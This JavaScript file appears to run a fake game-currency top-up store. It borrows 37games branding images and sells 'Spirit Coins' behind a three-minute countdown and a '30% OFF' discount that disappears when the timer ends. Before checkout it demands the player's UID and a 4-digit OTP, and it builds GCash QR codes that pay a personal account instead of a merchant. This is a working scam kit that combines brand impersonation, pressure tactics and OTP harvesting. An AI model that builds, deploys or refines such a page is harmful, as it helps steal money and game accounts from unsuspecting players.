const QR_PREFIX = "00020101021227830012com.p2pqrpay0111GXCHPHM2XXX02089996440303152170200000006560417DWQM4TK3JDNXHVH3U52046016530360854";

const products = [
    { id: 1, name: "30 Spirit Coins", basePrice: 750, diamond: 150, qrData: "06750.005802PH5912NA******L G.6014Pulong Balibag61041234630472C4" },
    { id: 2, name: "50 Spirit Coins", basePrice: 1250, diamond: 250, qrData: "071250.005802PH5912NA******L G.6014Pulong Balibag6104123463047426" },
    { id: 3, name: "100 Spirit Coins", basePrice: 2500, diamond: 500, qrData: "072500.005802PH5912NA******L G.6014Pulong Balibag6104123463049F17" },
    { id: 4, name: "150 Spirit Coins", basePrice: 3750, diamond: 750, qrData: "073750.005802PH5912NA******L G.6014Pulong Balibag610412346304C4F7" },
    { id: 5, name: "300 Spirit Coins", basePrice: 7500, diamond: 1500, qrData: "077500.005802PH5912NA******L G.6014Pulong Balibag6104123463048F73" },
    { id: 6, name: "500 Spirit Coins", basePrice: 10000, diamond: 2250, qrData: "810000.005802PH5912NA******L G.6014Pulong Balibag61041234630477D8" }
];

const DEFAULT_QR = "00020101021127830012com.p2pqrpay0111GXCHPHM2XXX02089996440303152170200000006560417DWQM4TK3JDNXHVH3U5204601653036085802PH5912NA******L G.6014Pulong Balibag610412346304AA80";

const ASSETS = {
    logo: "https://gimages.37games.com/aws_s3/img?s=/platform/one_image/2025/09/175809014247953944.png",
    diamond: "https://gimages.37games.com/aws_s3/img?s=/platform/one_image/2025/09/175809014332663363.png",
    gcash: "https://img.utdstc.com/icon/711/4cb/7114cb1d21a6384a13ea739687e23c1faa7c131954b8d39d6da308cde9cdc04c:200"
};

let cart = [];
let isFlashSaleOver = false;
let popperInstance = null;

window.onload = async () => {
    await cacheImages();
    startTimer(180, document.querySelector('#timer'));
    initStore();
};

async function cacheImages() {
    for (const [key, url] of Object.entries(ASSETS)) {
        let cached = localStorage.getItem(`cache_${key}`);
        if (!cached) {
            try {
                const response = await fetch(url);
                const blob = await response.blob();
                cached = await new Promise(resolve => {
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                });
                localStorage.setItem(`cache_${key}`, cached);
            } catch (e) { cached = url; }
        }
        document.querySelectorAll(`[data-src="${key}"]`).forEach(el => el.src = cached);
    }
}

function initStore() {
    const grid = document.getElementById('product-grid');
    const coinImg = localStorage.getItem('cache_logo') || ASSETS.logo;
    const diaImg = localStorage.getItem('cache_diamond') || ASSETS.diamond;
    
    grid.innerHTML = products.map(p => {
        const originalPrice = Math.round(p.basePrice * 1.3);
        const currentPrice = isFlashSaleOver ? originalPrice : p.basePrice;
        
        return `
        <div class="group relative card-bg rounded-xl overflow-hidden border border-gray-800 transition-all hover:border-yellow-600/50">
            <div class="absolute top-0 left-0 promo-ribbon px-2 py-1.5 z-10 flex items-center space-x-1">
                <img src="${diaImg}" class="w-3 h-3 object-contain">
                <span class="text-black text-[9px] font-black italic">+${p.diamond} (Bonus)</span>
            </div>
            
            ${!isFlashSaleOver ? `<div class="absolute top-2 right-2 bg-red-600/20 text-red-500 text-[10px] px-2 py-0.5 rounded font-black border border-red-500/30">30% OFF</div>` : ''}

            <div class="h-32 flex items-center justify-center p-4">
                <img src="${coinImg}" class="w-16 h-16 coin-glow pointer-events-none">
            </div>
            <div class="p-3 bg-gray-900/60 border-t border-gray-800/50 pointer-events-none">
                <h3 class="font-bold text-xs text-white mb-2 truncate">${p.name}</h3>
                <div class="flex justify-between items-end">
                    <div class="flex flex-col">
                        ${!isFlashSaleOver ? `<span class="text-[10px] text-gray-500 line-through">${originalPrice} PHP</span>` : ''}
                        <span class="text-sm font-black text-yellow-500">${currentPrice} PHP</span>
                    </div>
                    <button class="add-to-cart-trigger pointer-events-auto bg-[#f3bc3e] text-black p-2 rounded-lg active:scale-90 transition-transform" data-id="${p.id}">
                        <svg class="w-5 h-5 pointer-events-none" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                    </button>
                </div>
            </div>
        </div>`;
    }).join('');

    grid.querySelectorAll('.add-to-cart-trigger').forEach(btn => btn.onclick = () => addToCart(parseInt(btn.dataset.id)));
}

function addToCart(pid) {
    const p = products.find(x => x.id === pid);
    const price = isFlashSaleOver ? Math.round(p.basePrice * 1.3) : p.basePrice;
    const existing = cart.find(i => i.id === pid);
    if (existing) existing.qty++; else cart.push({ ...p, price, qty: 1 });
    updateTotalsOnly();
    renderCartList();
}

function updateTotalsOnly() {
    const total = cart.reduce((s, i) => s + (i.price * i.qty), 0);
    const count = cart.reduce((s, i) => s + i.qty, 0);
    const str = total.toLocaleString() + ".00 PHP";
    document.getElementById('bar-total').innerText = str;
    document.getElementById('bar-count').innerText = count;
    document.getElementById('drawer-total').innerText = str;
    document.getElementById('drawer-count').innerText = count;
    document.getElementById('bottom-payment-total').innerText = str;
    document.getElementById('payment-final-total').innerText = str;
}

function renderCartList() {
    const container = document.getElementById('cart-items-container');
    const coinImg = localStorage.getItem('cache_logo') || ASSETS.logo;
    if (cart.length === 0) { container.innerHTML = '<div class="text-center py-6 text-gray-400 uppercase text-xs font-bold">Empty</div>'; return; }
    container.innerHTML = cart.map((i, idx) => `
        <div class="flex items-center space-x-4 border-b pb-4 last:border-0">
            <div class="w-12 h-12 bg-gray-50 rounded-lg p-1 border flex-shrink-0"><img src="${coinImg}" class="w-full h-full object-contain"></div>
            <div class="flex-1">
                <div class="flex justify-between font-black text-xs uppercase text-gray-900"><span>${i.name}</span><button onclick="removeItem(${idx})" class="text-gray-300 hover:text-red-500">✕</button></div>
                <div class="flex items-center mt-2 border rounded w-max bg-white text-gray-900 shadow-sm"><button onclick="updateQty(${idx}, -1)" class="px-3 py-1">-</button><span class="px-4 py-1 font-bold text-xs text-center min-w-[35px]">${i.qty}</span><button onclick="updateQty(${idx}, 1)" class="px-3 py-1">+</button></div>
            </div>
        </div>`).join('');
}

function updateQty(idx, delta) { cart[idx].qty += delta; if (cart[idx].qty < 1) cart.splice(idx, 1); updateTotalsOnly(); renderCartList(); }
function removeItem(idx) { cart.splice(idx, 1); updateTotalsOnly(); renderCartList(); }

function toggleCart() {
    const d = document.getElementById('cart-drawer');
    const arrow = document.getElementById('arrow-icon');
    if (d.classList.contains('translate-y-0')) {
        d.classList.add('translate-y-full');
        d.classList.remove('translate-y-0', 'opacity-100');
        arrow.classList.remove('rotate-180');
        setTimeout(() => { if(d.classList.contains('translate-y-full')) d.style.visibility = 'hidden'; }, 400);
    } else {
        d.style.visibility = 'visible';
        d.classList.remove('translate-y-full');
        d.classList.add('translate-y-0', 'opacity-100');
        arrow.classList.add('rotate-180');
    }
}

function showValidationPopover(targetId, msg) {
    const target = document.getElementById(targetId);
    const popover = document.getElementById('popover-validation');
    document.getElementById('popover-message').innerText = msg;
    if (popperInstance) popperInstance.destroy();
    popover.classList.remove('invisible', 'opacity-0');
    
    // Fixed strategy prevents popover from adjusting page height/bumping bar
    popperInstance = Popper.createPopper(target, popover, {
        placement: 'top',
        strategy: 'fixed',
        modifiers: [
            { name: 'offset', options: { offset: [0, 12] } },
            { name: 'preventOverflow', options: { boundary: 'viewport' } }
        ]
    });
    setTimeout(() => { popover.classList.add('invisible', 'opacity-0'); }, 4000);
}

function openPayment() {
    const uidIn = document.getElementById('uid_input');
    const otpIn = document.getElementById('otp_input');
    const u = uidIn.value.trim();
    const o = otpIn.value.trim();
    const coinImg = localStorage.getItem('cache_logo') || ASSETS.logo;
    const diaImg = localStorage.getItem('cache_diamond') || ASSETS.diamond;

    if (cart.length === 0) { showValidationPopover('store-submit-btn', "Please select an item first."); return; }
    if (!u || o.length !== 4) {
        document.getElementById('input-section').scrollIntoView({ behavior: 'smooth', block: 'center' });
        if (!u) { showValidationPopover('uid_input', "A valid Player UID is required."); uidIn.focus(); }
        else { showValidationPopover('otp_input', "Valid 4-digit OTP required."); otpIn.focus(); }
        return;
    }
    const paymentView = document.getElementById('payment-view');
    paymentView.classList.remove('invisible', 'pointer-events-none', 'translate-y-full');
    document.getElementById('payment-count').innerText = cart.reduce((s, i) => s + i.qty, 0);
    document.getElementById('payment-items-list').innerHTML = cart.map(i => `
        <div class="flex-shrink-0 text-center w-28 bg-gray-50 p-2 rounded-lg border">
            <div class="flex justify-center space-x-1 mb-1"><img src="${coinImg}" class="h-5"><img src="${diaImg}" class="h-5"></div>
            <p class="text-[9px] font-black text-[#d35a44]">Diamond*${i.diamond}(Bonus)</p>
            <p class="text-[9px] font-bold text-gray-800 mt-1">Qty: ${i.qty}</p>
        </div>`).join('');
}

function closePayment() {
    const p = document.getElementById('payment-view');
    p.classList.add('translate-y-full');
    setTimeout(() => p.classList.add('invisible', 'pointer-events-none'), 400);
}

function showQR() {
    const total = cart.reduce((s, i) => s + (i.price * i.qty), 0);
    let qrFinalString = DEFAULT_QR;
    if (!isFlashSaleOver && cart.length === 1 && cart[0].qty === 1) qrFinalString = QR_PREFIX + cart[0].qrData;
    document.getElementById('qr-amount-display').innerText = total.toLocaleString() + ".00 PHP";
    const modal = document.getElementById('qr-modal');
    modal.classList.remove('hidden');
    setTimeout(() => modal.classList.add('opacity-100'), 10);
    const container = document.getElementById('qrcode');
    container.innerHTML = ""; 
    new QRCode(container, { text: qrFinalString, width: 180, height: 180 });
}

function hideQR() { document.getElementById('qr-modal').classList.remove('opacity-100'); setTimeout(() => document.getElementById('qr-modal').classList.add('hidden'), 300); }

function dismissBanner() { 
    const banner = document.getElementById('sticky-banner');
    if (banner) {
        banner.remove();
        document.getElementById('content-wrapper').classList.replace('pt-16', 'pt-4');
    }
    isFlashSaleOver = true;
    initStore(); 
    cart = []; 
    updateTotalsOnly();
}

function startTimer(duration, display) {
    let timer = duration, min, sec;
    const interval = setInterval(() => {
        min = parseInt(timer / 60, 10); sec = parseInt(timer % 60, 10);
        display.textContent = `${min < 10 ? "0" + min : min}:${sec < 10 ? "0" + sec : sec}`;
        if (--timer < 0) { clearInterval(interval); dismissBanner(); }
    }, 1000);
      }
